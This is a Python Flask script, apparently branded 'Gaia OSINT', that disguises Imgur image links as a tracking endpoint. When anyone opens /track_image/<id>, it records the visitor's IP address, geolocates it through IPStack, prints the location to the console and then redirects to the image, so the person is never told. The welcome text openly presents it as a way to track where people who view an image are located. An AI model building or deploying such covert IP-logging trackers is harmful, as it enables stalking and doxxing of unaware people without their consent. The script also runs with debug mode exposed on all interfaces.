from flask import Flask, request, jsonify, redirect
import requests
import os
from dotenv import load_dotenv
from cachetools import TTLCache
import ipaddress

# Función para pedir las claves y crear el archivo .env automáticamente
def create_env_file():
    imgur_client_id = input("Introduce tu IMGUR_CLIENT_ID: ")
    ipstack_api_key = input("Introduce tu IPSTACK_API_KEY: ")

    with open('.env', 'w') as env_file:
        env_file.write(f"IMGUR_CLIENT_ID={imgur_client_id}\n")
        env_file.write(f"IPSTACK_API_KEY={ipstack_api_key}\n")

    print("Archivo .env creado con éxito.")

# Cargar las variables de entorno desde un archivo .env, o crear el archivo si no existe
if not os.path.exists('.env'):
    print("El archivo .env no existe. Creando archivo .env...")
    create_env_file()

load_dotenv()

app = Flask(__name__)

# Configuración de la API de Imgur y geolocalización
IMGUR_CLIENT_ID = os.getenv('IMGUR_CLIENT_ID')
IPSTACK_API_KEY = os.getenv('IPSTACK_API_KEY')

# Verificación de que las claves estén configuradas
if not IMGUR_CLIENT_ID or not IPSTACK_API_KEY:
    print("Faltan claves de API. Creando archivo .env...")
    create_env_file()
    load_dotenv()

# Caché de imágenes subidas (TTL de 24 horas, max 100 imágenes por IP)
image_cache = TTLCache(maxsize=100, ttl=86400)

# Validar IP
def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Obtener la geolocalización usando IPStack
def get_geolocation(ip):
    if not validate_ip(ip):
        return None
    
    url = f"http://api.ipstack.com/{ip}?access_key={IPSTACK_API_KEY}"
    response = requests.get(url)
    
    if response.status_code == 200:
        return response.json()
    return None

# Ruta para generar el enlace de Imgur y capturar la geolocalización
@app.route('/track_image/<image_id>')
def track_image(image_id):
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # Obtener la geolocalización del usuario
    geolocation = get_geolocation(user_ip)

    # Imprimir la geolocalización en la consola para rastrearla
    if geolocation:
        print(f"IP: {user_ip}, Geolocalización: {geolocation}")

    # Redirigir al enlace de la imagen en Imgur
    imgur_link = f"https://i.imgur.com/{image_id}.jpeg"
    return redirect(imgur_link)

# Ruta para ver las imágenes subidas por el usuario
@app.route('/my_images')
def my_images():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if user_ip in image_cache:
        return jsonify({'images': image_cache[user_ip]}), 200
    else:
        return jsonify({'message': 'No has subido imágenes recientemente.'}), 200

# Función para imprimir el arte ASCII y un mensaje de bienvenida
def print_ascii_art():
    art = r"""
     _______ ______    ______   ______  _______ 
    |   _   |   _  \  |   _  \ |   _  \|   _   |
    |  |_|  |  |_|  | |  |_|  ||  |_|  |  |_|  |
    |       |   ___/  |   ___/ |   _   |       |
    |___|___|__|      |__|     |__| |__|___|___|
    
                  By Gaia OSINT
    """
    print(art)
    print("\nBienvenido a Gaia OSINT")
    print("\nPara usar este programa, sigue estos pasos:")
    print("1. Asegúrate de tener tu IMGUR_CLIENT_ID y IPSTACK_API_KEY.")
    print("2. Si es tu primera vez ejecutando el programa, se te pedirá que los ingreses.")
    print("3. Sube una imagen accediendo a la URL base de la aplicación.")
    print("4. Para rastrear la geolocalización de un usuario que acceda a una imagen, usa /track_image/<image_id>.")
    print("\n¡Disfruta usando Gaia OSINT!\n")

if __name__ == '__main__':
    # Imprimir el arte ASCII y la bienvenida
    print_ascii_art()

    # Iniciar la aplicación en el puerto asignado por Heroku
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
